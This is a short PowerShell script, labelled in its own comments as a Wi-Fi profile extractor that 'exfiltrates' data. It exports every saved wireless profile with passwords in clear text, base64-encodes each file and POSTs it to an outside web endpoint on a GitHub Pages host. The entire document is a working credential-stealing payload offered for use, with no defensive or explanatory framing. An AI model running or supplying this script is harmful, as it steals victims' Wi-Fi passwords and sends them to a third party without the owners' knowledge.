# Wi-Fi profile extractor and uploader
# Exfiltrates to your GitHub Pages endpoint

$exportFolder = Join-Path $env:TEMP "wifi_profiles"
New-Item -ItemType Directory -Path $exportFolder -Force | Out-Null
netsh wlan export profile folder="$exportFolder" key=clear
$uri = "https://personfu.github.io/CyberWorld_login/collect.php"
Get-ChildItem "$exportFolder\*.xml" | ForEach-Object {
    $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
    $enc = [Convert]::ToBase64String($bytes)
    $body = @{file=$enc; filename=$_.Name}
    Invoke-WebRequest -Uri $uri -Method POST -Body $body -UseBasicParsing
}
